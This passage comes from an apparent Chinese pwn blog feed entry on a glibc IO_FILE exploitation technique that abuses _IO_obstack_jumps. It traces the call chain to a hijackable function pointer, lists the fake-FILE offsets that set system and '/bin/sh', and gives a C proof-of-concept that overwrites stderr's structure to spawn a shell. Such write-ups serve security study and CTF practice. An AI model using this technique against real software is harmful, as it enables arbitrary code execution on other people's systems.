class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到这个也是一个宏定义，同样的我们又必须通过<code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code>这条if语句才能调用到<code>_obstack_newchunk</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">  _obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里可以直接调用到我们期望的宏定义<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>可以看到这里存在直接拿指针当作函数的操作<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，条件也就是<code>(((h)-&gt;use_extra_arg)</code>不为0；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以从上到下的调用链也是可以直接写出来了:</p><p><code>_IO_obstack_xsputn</code>=&gt;<code>obstack_grow</code>=&gt;<code>_obstack_newchunk</code>=&gt;<code>CALL_CHUNKFUN</code>=&gt;<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p><p>最后再根据结构体属性的偏移写上上述约束的值即可。</p><p>当<code>_IO_list_all</code>指向我们可控A地址时，我们需要对A地址写入如下数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A + <span class="number">0x18</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x20</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x28</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x30</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x38</span> = system_addr;</span><br><span class="line">A + <span class="number">0x48</span> = bin_sh_addr;</span><br><span class="line">A + <span class="number">0x50</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0xd8</span> = _IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">A + <span class="number">0xe0</span> = A;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201134245450.png"                      alt="image-20221201134245450"                ></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> bin_sh_addr[<span class="number">0x10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> printf_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *IO_2_1_stderr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> IO_obstack_jumps;</span><br><span class="line"><span class="built_in">strcpy</span>(bin_sh_addr,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start!\n&quot;</span>);</span><br><span class="line">printf_addr = <span class="built_in">printf</span>;</span><br><span class="line">libc_base = printf_addr - <span class="number">0x55700</span>;</span><br><span class="line"></span><br><span class="line">IO_2_1_stderr = libc_base + <span class="number">0x1f7680</span>;</span><br><span class="line">IO_obstack_jumps = libc_base + <span class="number">0x1f33a0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x28</span>/<span class="number">8</span>)) = <span class="number">0x1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x30</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x18</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x20</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x50</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xd8</span>/<span class="number">8</span>)) = IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xe0</span>/<span class="number">8</span>)) = IO_2_1_stderr;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x38</span>/<span class="number">8</span>)) = system;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x48</span>/<span class="number">8</span>)) = bin_sh_addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上libc均使用:<code>Ubuntu GLIBC 2.36-0ubuntu4</code></p><hr><p>参考文章</p><p><a class="link"   href="https://tttang.com/archive/1845/#toc" >https://tttang.com/archive/1845/#toc<i class="fas fa-external-link-alt"></i></a>_</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;近期又出现一个新的关于&lt;code&gt;IO_FILE&lt;/code&gt;的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。&lt;/p&gt;
&lt;h2 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
</feed>
